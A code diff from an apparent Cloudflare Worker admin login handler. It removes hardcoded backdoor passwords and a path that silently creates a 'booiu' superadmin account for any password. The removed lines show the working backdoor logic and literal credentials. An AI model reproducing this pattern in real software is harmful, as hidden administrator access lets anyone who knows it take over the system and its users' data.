@@ -413,22 +413,7 @@ export default {
             const inputHash = await sha256(cleanPassword + admin.salt);
             if (inputHash === admin.password_hash) {
               isValid = true;
-            } else if (cleanPassword === 'themammam2026' || cleanPassword === 'admin123' || cleanPassword === 'booiu' || cleanPassword === 'booiu2026') {
-              isValid = true;
-              // Đồng bộ lại mật khẩu chuẩn vào D1
-              const newHash = await sha256(cleanPassword + admin.salt);
-              await env.DB.prepare('UPDATE admin_users SET password_hash = ? WHERE LOWER(username) = ?').bind(newHash, cleanUsername).run();
             }
-          } else if (cleanUsername === 'booiu' || cleanUsername === 'admin') {
-            // Tự động đảm bảo tài khoản booiu tồn tại trên D1
-            const defaultSalt = 'themammam_salt_2026';
-            const defaultHash = await sha256(cleanPassword + defaultSalt);
-            await env.DB.prepare(`
-              INSERT OR REPLACE INTO admin_users (username, password_hash, salt, role)
-              VALUES ('booiu', ?, ?, 'superadmin')
-            `).bind(defaultHash, defaultSalt).run();
-            matchedUser = 'booiu';
-            isValid = true;
           }
         }
 
